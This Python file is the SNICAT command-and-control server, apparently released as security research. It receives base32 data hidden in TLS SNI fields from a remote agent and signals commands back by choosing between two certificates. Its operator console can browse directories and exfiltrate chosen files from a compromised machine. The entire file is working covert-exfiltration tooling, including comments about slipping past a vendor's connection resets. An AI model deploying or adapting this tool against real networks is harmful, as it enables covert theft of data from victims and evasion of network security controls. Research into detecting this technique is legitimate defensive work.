#!/usr/bin/env python3

"""
SNICAT C2 
www.mnemonic.no
https://github.com/mnemonic-no/SNIcat
Author: Morten Marstrander, Matteo Malvica
"""

import dpkt
import socket
import ssl
import sys
import time
import base64
import binascii
import math
from socket import error as SocketError
from colorama import Fore
from _thread import start_new_thread
from queue import Queue


def printProgressBar (iteration, total, prefix = '', suffix = '', decimals = 1, length = 20, fill = '█', printEnd = ""):
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)

    print(Fore.YELLOW,end="")
    print('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix), end = printEnd)

    if iteration == total: 
        print()

def printEnumList(in_list):
    for i, item in enumerate(in_list):
        print(i, '- ' + item)
        
def agentDead():
    global agentName
    print(Fore.RED,end="")
    print("\n\n")
    print("-"*64)
    print("(#) AGENT  '%s' is DEAD" % agentName)
    print("-"*64)
        
def sendCert(context, conn):
    try:
        context.wrap_socket(conn, server_side=True)
    except ssl.SSLError as e:
        if logEnabled:
            print(e)
        pass
    except Exception as e:
        if logEnabled:
            print(e)
        pass

def parseBuffer(buf,conn):
    try:
        buf += conn.recv(1024, socket.MSG_PEEK)
        if not buf:
            if logEnabled:
                print("Error, no data received from client", addr)
            return
        else:
            return buf
    except SocketError as e:
        # here we bypass a specific vendor by creating a new socket each time we get a RST
        if logEnabled:
            print(e)

            print("ouch! Handling vendorX RST, moving on...")

        time.sleep(0.05)

        sendCert(bad_context, conn)
        conn.close()
        socketCreate(hello_queue)
        
        
def threadedHandleTlsConnection(conn, addr, hello_queue):
    good_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    good_context.options = (ssl.OP_NO_TLSv1_3)
    good_context.load_cert_chain(goodCert, goodKey)
    bad_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    bad_context.options = (ssl.OP_NO_TLSv1_3)
    bad_context.load_cert_chain(badCert, badKey)

    buf = b""

    while True:
        buf = parseBuffer(buf,conn)

        try:
            records, bytes_used = dpkt.ssl.tls_multi_factory(buf)
        except dpkt.dpkt.NeedData:
            if logEnabled:
                print("Need more data!")
            continue
        if logEnabled:
            print("(*) - %d bytes received in buffer" % bytes_used)
        for record in records:
            if record.type == 22 and bytearray(record.data)[0] == 1: # Client Hello
                hello = dpkt.ssl.TLSHandshake(record.data).data
                sni_raw = dict(hello.extensions).get(0,None)
                sni = None
                if sni_raw:
                    sni = sni_raw[5:]
                if sni:
                    response_queue = Queue()
                    hello_queue.put( [sni, response_queue] )
                    bit = response_queue.get()
                    if bit:
                            wrap = sendCert(bad_context, conn)
                    else:
                            wrap = sendCert(good_context, conn)
                    return

def socketCreate(hello_queue):
    host = "0.0.0.0" # this value is hardcoded, but could be changed depending on the scenario
    port = int(sys.argv[1])

    try:
        sobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sobj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        sobj.bind((host, port))
        sobj.listen(5)
        sobj.settimeout(5)

        conn, addr = sobj.accept()
        start_new_thread(threadedHandleTlsConnection, (conn, addr, hello_queue))
        sobj.close()
    except socket.timeout as e:
        if logEnabled:
            print(e)
        sobj.close()
        agentDead()
        socketLoop()
        print(Fore.LIGHTGREEN_EX,end="")
    except SocketError as e:
        if logEnabled:
            print(e)
            print("handling socket err")
        pass
    except:
        print(Fore.RED,end="")
        sobj.close()
        socketLoop()
        
def parseSniPayload(cmd,arg):
    global agentName
    global currentFileSizeList 
    global currentDirList
    tested_dir_number = ''
    hello_queue = Queue()

    try:
        start_new_thread(socketCreate, (hello_queue, ))
    except Exception as e:
        print("(!)'%s' exception while creating thread in 'parseSniPayload'" % e)
        return
    
    sni, bit_queue = hello_queue.get() # Get sni and a queue we can write a bit back into
    sni = str(sni, 'utf-8')

    try:
        sni_command = sni.split('.')[0]
    except ValueError as e:
         print("(!)'%s' exception while parsing sni_command in 'parseSniPayload'" % e)
         return

    if logEnabled:
        print("(*) RECEIVED: %s b32 PAYLOAD" % sni_command)
        
    try:
        while(len(sni_command) % 8 != 0):
            sni_command = sni_command + "="
        try:
            decoded_payload = "\n".join((str(base64.b32decode(sni_command),'utf-8')).split('\\n')).replace('b\'','').replace('\'','')
        except Exception as e:
            print("(!)'%s' exception while decoding SNI in 'parseSniPayload' - exiting thread" % e)
            return
            
        if logEnabled:
            print("(*) BASE32 DECODED OUTPUT:")

        print(Fore.LIGHTWHITE_EX,end="")

        if cmd == "LD":
            currentDirList = decoded_payload.replace('\x00','').split('\n')
            print("- Current folder list - \n")
            printEnumList(currentDirList)
            print("\n(*) - Access the desired folder with 'cd <folder_nr>'")
        elif cmd == "SIZE":
            currentFileSizeList = decoded_payload.replace('\x00','').split('\n')
            if arg == 0:
                printEnumList(currentFileSizeList)
        elif cmd == "CD":
            whished_dir_number = arg
        elif cmd == "ALIVE":
            agentName = decoded_payload
            print("($) AGENT  '%s' is ALIVE" % agentName)
        else:
            print(decoded_payload)
            
        bit_queue.put(0)
        print(Fore.LIGHTGREEN_EX,end="")
        return decoded_payload
    except binascii.Error as e:
            print(e)
            print("(!) Encoding Error[1] - trying once more!")
            retrieveCmd(cmd,0,0)
            return
    except UnicodeDecodeError as e:
            print(e)
            print("(!) Encoding Error[2] - trying once more!")
            retrieveCmd(cmd,0,0)
            
def retrieveCmdContent():
        global currentFileList
        print(Fore.LIGHTWHITE_EX,end='')
        decoded_content_list = []

        while True:
            hello_queue = Queue()
            start_new_thread(socketCreate, (hello_queue, ))
            sni, bit_queue = hello_queue.get() # Get sni and a queue we can write a bit back into
            sni = str(sni, 'utf-8')
            sni_file_chunk = sni.split('.')[0]

            if "finito" in sni: 
                if logEnabled:
                    print("(-) Received: %s file content" % sni)

                bit_queue.put(0)
                decoded_file_content = "".join(decoded_content_list)
                
                while(len(decoded_file_content) % 8 != 0):
                    decoded_file_content = decoded_file_content + "="
                try:
                    decoded_file_content = str(base64.b32decode(decoded_file_content),'utf-8')
                except binascii.Error as e:
                    print(e)
                    print("binascii error! passing")
                    socketLoop()
                    return

                currentFileList = decoded_file_content.replace('\x00','').split('\n')
                print("- Current file list - \n")
                printEnumList(currentFileList)
                print("\n(*) - Exfiltrate the desired file with 'ex <file_nr>'")
                print(Fore.LIGHTGREEN_EX, end='')
                return "test"
            else:
                decoded_content_list.append(sni_file_chunk)
                bit_queue.put(0) 



def retrieveFileContent(file_size,file_name):
    global currentFileList
    print(Fore.LIGHTWHITE_EX,end="")
    i = 0
    length = math.ceil(float(file_size)/150)

    decoded_file_list = []
    printProgressBar(0, length, prefix = 'Progress:', suffix = 'Complete', length = 20)

    while True:
        i += 1
        hello_queue = Queue()
        start_new_thread(socketCreate, (hello_queue, ))
        sni, bit_queue = hello_queue.get() 
        
        sni = str(sni, 'utf-8')
        sni_file_chunk = sni.split('.')[0]

        if "finito" in sni:
            bit_queue.put(0)
            decoded_file = "".join(decoded_file_list)

            while(len(decoded_file) % 8 != 0):
                decoded_file = decoded_file + "="

            try:
                decoded_file = base64.b32decode(decoded_file)
            except binascii.Error:
                print("(!) binascii error in 'retrieveFileContent' - exiting")
                return

            with open(file_name, "wb") as exfiltrated_file:
                    exfiltrated_file.write(decoded_file)
                    exfiltrated_file.close()

            return decoded_file
        else:
            printProgressBar(i, length, prefix = ' SNIcking in progress:', suffix = 'Complete ', length = 20)
            chunk_len = len(sni_file_chunk)

            if chunk_len != 128:
                decoded_file_list.append(sni_file_chunk)
                time.sleep(0.01)
                bit_queue.put(0) 
            else:
                print("(!) Unhandled exception in 'retrieveFileContent' - exiting")
                return

def retrieveFileNr(file_number,file_size):
    global currentFileList
    target_file_name = (currentFileList[int(file_number)])

    while True:
        hello_queue = Queue()
        start_new_thread(socketCreate, (hello_queue, ))
        sni, bit_queue = hello_queue.get() 
        sni_command = str(sni).split('-')[0]

        if file_number in sni_command:
            if logEnabled:
                print("(-) Received: %s file and we selected %s file  - replying with good cert" % (sni_command, file_number))
            bit_queue.put(0)
            retrieveFileContent(file_size,target_file_name)
            print(Fore.LIGHTRED_EX,end="")
            print("\n(*) File '%s' Exfiltrated Successfully! \n" %(target_file_name))
            return
        else:
            bit_queue.put(1)

def retrieveFolderNr(folder_nr):
    while True:
        hello_queue = Queue()
        socket = start_new_thread(socketCreate, (hello_queue, ))
        sni, bit_queue = hello_queue.get() 
        sni_command = str(sni).split('-')[0]
        if folder_nr in sni_command:
            bit_queue.put(0)
            return
        else:
            bit_queue.put(1)
            
def retrieveCmd(cmd,argument,filesize):
    print(Fore.LIGHTMAGENTA_EX,end="")
    
    if logEnabled:
        print("(*) WAITING for yummy SNI form the agent - will timeout in 5 seconds")

    while True:
        hello_queue = Queue()
        socket = start_new_thread(socketCreate, (hello_queue, ))
        sni, bit_queue = hello_queue.get() 
        sni_command = str(sni).split('-')[0]

        if (cmd in sni_command):
            bit_queue.put(0)
            if "CD" in sni_command:
                retrieveFolderNr(argument)
                return
            elif "EX" in sni_command:
                retrieveFileNr(argument,filesize)
                return
            elif "LS" in sni_command:
                return retrieveCmdContent()
            elif "LIST" in sni_command:
                return retrieveCmdContent()
            else:
                return parseSniPayload(cmd,argument)
        else:
            bit_queue.put(1)

def retrieveCmdWrapperAndSetPrompt(in_value,arg,arg2):
    prompt_folder = (retrieveCmd(in_value.upper(),arg,arg2)).rstrip('\x00')
    if "WHERE" in in_value.upper():
        currentPath = prompt_folder
    prompt = ("snicat-c2#%s>"%(prompt_folder))
    return prompt

def c2Help():
    print(Fore.YELLOW,end="")
    print("""\n# SNICAT C2 #""")
    print("""\nAvailable Commands:""")
    print("""\nWHERE\t\t - \tdisplay current folder""")
    print("""LIST\t\t - \tdisplay all content in current folder""")
    print("""LS\t\t - \tdisplay only files in the currenet folder""")
    print("""SIZE\t\t - \tdisplay size of files in the currenet folder""")
    print("""LD\t\t - \tdispl every directory in current folder""")
    print("""CB\t\t - \tmoves down to root tree folder - similar to 'cd .. \' """)
    print("""CD <folder-id> \t - \tmoves up the specified folder""")
    print("""EX <file-id> \t - \texfiltrate the specified file""")
    print("""ALIVE \t\t - \tcheck alive/dead agent""")
    print("""EXIT \t\t - \tquit the C2 server\n""")
    print("""# Example Usage #\n""")
    print("""> where\t # dislay current working path""")
    print("""> ls\t # list files in current folder""")
    print("""> ex 3\t # exfiltrate file nr 3""")
    print("""> ld\t # list folders in current working path""")
    print("""> cd 2\t # move into the second folder from the list\n""")
    print(Fore.LIGHTGREEN_EX,end="")

def printCat():
    print("""\n\n""")
    print("""           __..--''``---....___   _..._    __""")
    print(""" /// //_.-'    .-/";  `        ``<._  ``.''_ `. / // """)
    print("""///_.-' _..--.'_    \                    `( ) ) // //""")
    print("""/ (_..-' // (< _     ;_..__               ; `' / ///""")
    print(""" / // // //  `-._,_)' // / ``--...____..-' /// / // - ('frrr') - Gigi""")
    
def printLogo():
    print(Fore.LIGHTRED_EX,end="")
    print("\n")
    print("    %%                                                      ")
    print("  %% %%                                                     ")
    print(" %%  %%                                                     ")
    print("  %   %%                                                    ")
    print("  %%   %%                                                   ")
    print("   %   %%                   $                       %       ")
    print("   %%   %%                 % %                     %%%      ")
    print("    %&   %%               %%%%%%                  %%%%%%%   ")
    print("    $%   %%              %%%%%%%%%              %%%%%%%%%%  ")
    print("     %%   %%            %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% ")
    print("      %%   %%          .%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.")
    print("       %%   %          %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%")
    print("        %&  (%         %%%%%%%%%               %%%%%%%%%%%%%")
    print("         %.  %%        %%%%%                       %%%%%%%%%")
    print("          %   %%       %%%%   %%%          %%%%     %%%%%%% ")
    print("           %   %,       %%%   %%%          %%%%      %%%%%% ")
    print("           (% #%%%%     %%%&                        %%%%%%  ")
    print("          %%%%//%%&       %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%   ")
    print("             %%#(%%&        %%%%%%%%%%%%%%%%%%%%%%%%%%%     ")
    print("              %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        ")
    print("               %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%     ")
    print("                %%/%%%%%&(  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%   ")
    print("                         %%%%%%%/////%%%%%%%%%%   %%%%%%%%% ")
    print("                 %%%%%%%%%%%%%%%%%%%%/%///%/%%       %%%%%%%")
    print("             %%%%%%%%%%%%%%%%%%%%%%%%%/%%%%(%%        %%%%% ")
    print("           %%%%%%%%%%%%%%%%%%%%%%%%%%//%%//%%               ")
    print("          #%%%%%%%&               %%%%%%%%%%%%              ")
    print("                              %%%%%%%%%%%%%%%%              ")
    print("                             (%%%%%%%%%%%%%%%               ")
    print("                                %%%%%%%%&                   ")

def c2Banner():
    print(Fore.CYAN,end="")
    print("""\n ######################################################""")
    print(""" ###   SNICAT C2 SERVER                             ###""")
    print(""" ###   by Morten Marstrander & Matteo Malvica       ###""")
    print(""" ######################################################""")
    print("""\n\t"the not-so-advertized TLS feature"\n """)
    print("""Type 'HELP' or "?" for further instructions\n""")
    print(Fore.LIGHTGREEN_EX,end="")
    
def parseEX(inputValue):
    cmd = "EX"

    try:
        exfil_file_number = str(inputValue.split(' ')[1])
    except IndexError:
        print(Fore.RED,end="")
        print("\n(!) Please type a file index")
        c2Help()
        return

    if not exfil_file_number.isnumeric():
        print(Fore.RED,end="")
        print("\n(!) Please type a file index")
        c2Help()
        return

    flag = "noprint"

    if not currentFileList:
        print(Fore.RED,end="")
        print("(!) Please run 'ls' before exfiltrating a file")
        return
    retrieveCmd("SIZE",flag,0)
    exfil_file_size = currentFileSizeList[int(exfil_file_number)]  
    retrieveCmd(cmd,exfil_file_number,exfil_file_size)
    
def parseCD(inputValue):
    if not currentDirList:
        print(Fore.RED,end="")
        print("(!) Please run 'ld' before entering a folder")
        return

    cmd = "CD"
    dir_folder_number = str(inputValue.split(' ')[1])

    if not dir_folder_number.isnumeric():
        print("\n(!) Please type a directory number")
        c2Help()
        return

    retrieveCmd(cmd,dir_folder_number,0)
    currentPath = (retrieveCmd("WHERE",0,0)).rstrip('\x00')
    prompt = ("snicat-c2#:%s/>"%(currentPath))
    return prompt
   
def socketLoop():
    global currentFileSizeList 
    currentPath = ''
    agentName = 'UNKNOWN'
    prompt = "snicat-c2#"
    port = int(sys.argv[1])
    
    while True:
        print(Fore.LIGHTGREEN_EX, end ="")

        if logEnabled:
            print("current dir list is %s\n" % currentDirList)
            print("current path is %s\n" % currentPath)
            print("current file list is %s\n" % currentFileList)
            print("current file size list is %s\n" % currentFileSizeList)

        inputValue= input(prompt)

        if inputValue== "EXIT" or inputValue== "exit":
            print("\n\t...byez!\n")
            break
        elif inputValue== "WHERE" or inputValue== "where":
            prompt = retrieveCmdWrapperAndSetPrompt(inputValue,0,0)
        elif inputValue== "LIST" or inputValue== "list":
            retrieveCmdWrapperAndSetPrompt(inputValue,0,0)
        elif inputValue== "SIZE" or inputValue== "size":
            retrieveCmdWrapperAndSetPrompt(inputValue,0,0)
        elif inputValue== "LS" or inputValue== "ls":
            retrieveCmdWrapperAndSetPrompt(inputValue,0,0)
        elif inputValue== "ALIVE" or inputValue== "alive":
            agentName = retrieveCmd(inputValue.upper(),0,0)
        elif inputValue== "LD" or inputValue== "ld":
            retrieveCmdWrapperAndSetPrompt(inputValue,0,0)
        elif inputValue== "GIGI" or inputValue== "gigi":
            printCat()
        elif "EX" in inputValue or "ex" in inputValue:
            parseEX(inputValue)
        elif "CD" in inputValue or "cd" in inputValue:
            prompt = parseCD(inputValue)
        elif inputValue== "CB" or inputValue== "cb":
            prompt = retrieveCmdWrapperAndSetPrompt(inputValue,0,0)
        elif inputValue== "HELP" or inputValue== "help" or inputValue== "?" or inputValue== "h":
            c2Help()
        elif inputValue== "":
            pass
        else:
            print(Fore.RED,end="")
            print("\n\t(!) COMMAND NOT FOUND - TYPE 'HELP' FOR MORE\n")
            pass

def main():
    global currentPath
    global currentFileList
    global currentFileSizeList
    global currentDirList
    global prompt
    global agentName
    global goodCert
    global badCert
    global badKey
    global goodKey
    global logEnabled
    
    currentFileList = []
    currentDirList = []
    currentFileSizeList = []
    logEnabled = False

    if len(sys.argv) < 7:
        print(Fore.RED,end="")
        print("\n(!) ERROR:\t - missing argument -\n"+"-"*10)
        print("(*) USAGE:\t 'python3 %s <LISTENING_PORT> <GOOD_CERT> <GOOD_CERT_KEY> <BAD_CERT> <BAD_CERT_KEY> log=[on|off]'" % sys.argv[0])
        print("(*) EXAMPLE:\t 'python3 %s 443 certs/good.pem certs/good.key certs/ssl-cert-snakeoil.pem certs/ssl-cert-snakeoil.key log=on'\n"% sys.argv[0])
        sys.exit()
    else:
        goodCert = sys.argv[2]
        goodKey  = sys.argv[3]
        badCert  = sys.argv[4]
        badKey   = sys.argv[5]

        try:
            log_var = (sys.argv[6].split('='))[1]
        except Exception as e:
            print(Fore.RED,end="")
            print("(!)'%s' exception while parsing log_var in 'main'" % e)
            sys.exit()
            
        if "on" not in log_var and "off" not in log_var:
            print(Fore.RED,end="")
            print("(!) Wrong logging value provided")
            sys.exit()
            
        if "on" in log_var:
            logEnabled = True

        printLogo()
        c2Banner()
        socketLoop()

if '__main__' == __name__:
    main()
